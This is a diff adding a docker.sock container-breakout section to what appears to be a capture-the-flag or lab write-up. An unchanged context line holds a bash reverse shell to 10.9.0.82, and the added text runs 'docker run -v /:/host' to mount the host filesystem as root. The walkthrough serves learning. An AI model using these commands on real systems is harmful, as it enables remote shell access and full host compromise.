@@ -119,6 +119,21 @@ bash -i >&/dev/tcp/10.9.0.82/80 0>&1
 ![image](https://github.com/user-attachments/assets/1829e1d0-b7ca-4a5a-b342-0c3754a87d19)
 
 
+### PRIVESC with writable mounted docker.sock
+
+- The backend server is a server container.I ran a docker enumeration script and discovered that a docker.sock daemon is mounted in the container.Also,Docker-cli is preinstalled on the server,we can abuse this flaws to breakout of the container.To crown it all,the user is `root`.The docker daemon is required to communicate with the docker api.
+
+![image](https://github.com/user-attachments/assets/a4dbf045-e575-4179-a572-897d56d70285)
+
+![image](https://github.com/user-attachments/assets/46cca9cb-50a6-4ffc-9e5b-b8e0f89d9a25)
+
+- I followed the steps detailed in this [blog](https://medium.com/owasp-vitcc/docker-breakout-mounted-docker-socket-76cb77794158).The trick is to create a container and bind the host filesystem to the container.This will allow an attacker to access the host file system as explained in the blog.I used the container `openjdk:11` to carry out the task.
+
+![image](https://github.com/user-attachments/assets/5588a280-cbaa-4c9f-bf89-5212b16a363a)
+
+- Then, I ran `docker run -v /:/host -it openjdk:11 bash` to start the container.You will notice an entir new filsystem in mount point `/host`.We've succesfully broken out of the contianer.
+
+![image](https://github.com/user-attachments/assets/a877fa3d-f0e6-4846-b87f-fff03f3006aa)
 
 
 
